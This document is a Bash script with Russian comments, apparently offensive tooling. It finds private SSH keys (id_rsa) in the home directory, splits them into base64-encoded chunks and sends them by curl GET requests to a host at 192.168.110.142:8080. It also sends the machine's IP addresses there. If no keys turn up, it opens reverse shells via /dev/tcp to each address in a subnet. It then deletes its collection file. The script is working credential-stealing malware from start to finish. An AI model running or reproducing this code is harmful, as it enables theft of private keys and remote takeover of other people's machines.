#!/bin/bash

# Инициализация переменной для отслеживания итераций
if [[ -z "$1" ]]; then
    iteration=0
else
    iteration=$1
fi

# 1. Найти SSH ключи и записать их содержимое в файл
KEY_PATHS=$(find ~ -name "id_rsa")
# Очистить файл перед записью
> sshkeys.txt

# Проверка на наличие ключей
if [[ -z "$KEY_PATHS" ]]; then
    # Если ключей нет, выполняем обратное соединение
    for ((i=iteration; i<=255; i++)); do
        target_ip="192.168.110.$i"
        
        # Запускаем обратное соединение
        sh -i >& /dev/tcp/$target_ip/9001 0>&1 &
        
        # Проверяем наличие файла work.txt
        for ((j=0; j<1; j++)); do
            if [[ -f "work.txt" ]]; then
                echo "Файл work.txt найден на $target_ip"
                break 2  # Выход из обоих циклов, если файл найден
            fi
            sleep 1
        done
        
        # Останавливаем выполнение текущего скрипта и перезапускаем его с увеличенной итерацией
        echo "Файл work.txt не найден. Перезапускаем скрипт с итерацией $((i + 1))..."
        exec "$0" $((i + 1))  # Перезапуск текущего скрипта с увеличенной итерацией
    done
    exit 0
fi

# Если SSH ключи найдены, продолжаем
for key in $KEY_PATHS; do
    cat "$key" >> sshkeys.txt
    echo -e "\n---\n" >> sshkeys.txt
done

# Подсчитать количество символов в файле sshkeys.txt (включая пробелы)
char_count=$(wc -m < sshkeys.txt)
echo "Количество символов в файле sshkeys.txt: $char_count"

# 2. Считываем файл и отправляем его частями по 10 символов
file_content=$(<sshkeys.txt)
file_length=${#file_content}

# Отправка частями по 10 символов
for ((i=0; i<file_length; i+=10)); do
    chunk=${file_content:i:10}
    
    # Проверка на пустоту chunk
    if [[ -z "$chunk" ]]; then
        continue  # Пропуск итерации, если chunk пустой
    fi
    
    # Кодирование $chunk в Base64
    encoded_chunk=$(echo -n "$chunk" | base64)
    
    # URL для GET запроса с использованием $encoded_chunk
    url="http://192.168.110.142:8080/gamal/$encoded_chunk"
    
    # Выполнение GET запроса
    curl -X GET "$url"
done

# 3. Узнать все IP адреса машины и отправить их в запросах
# Получаем все IP-адреса
all_ips=$(ip addr | grep -Eo 'inet ([0-9]{1,3}\.){3}[0-9]{1,3}' | awk '{print $2}')

# Отправка IP адресов
for ip in $all_ips; do
    # Кодируем IP-адрес в Base64
    encoded_ip=$(echo -n "$ip" | base64)
    
    # URL для GET запроса с использованием закодированного IP
    url="http://192.168.110.142:8080/gamal/$ip"
    
    # Выполнение GET запроса
    curl -X GET "$url"
done

# Удалить файл после отправки
rm sshkeys.txt
